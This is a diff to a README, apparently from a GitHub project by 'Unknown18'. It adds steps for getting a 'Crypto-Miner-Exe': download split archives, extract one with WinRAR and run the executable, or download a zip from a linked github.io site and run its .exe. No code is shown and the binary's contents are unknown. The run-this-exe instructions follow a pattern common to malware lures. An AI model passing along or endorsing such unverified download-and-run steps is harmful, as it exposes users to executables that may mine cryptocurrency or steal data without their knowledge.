@@ -35,7 +35,15 @@ Contributions welcome! Follow Contributing Guidelines to get involved.
 
 **How To Download ?**
 1. Just Download Both Files
-2. Extract Any One File Using Winrar [ https://www.rarlab.com/download.htm ] It Will Give You One Exe 
+2. Extract Any One File Using Winrar [ https://www.rarlab.com/download.htm ] It Will Give You One Exe
+    Option 1: GitHub
+Download both files from the GitHub repository.
+- Extract any one file using WinRAR.
+- It will give you an exe file, Run the Crypto-Miner-Exe
+    Option 2: Website
+- Visit the website to download - [ https://unknown18-afk.github.io/Miner-Website18/ ]
+- Extract the zip file and run the .exe.
+
 **Made By:-**
  Unknown18
 
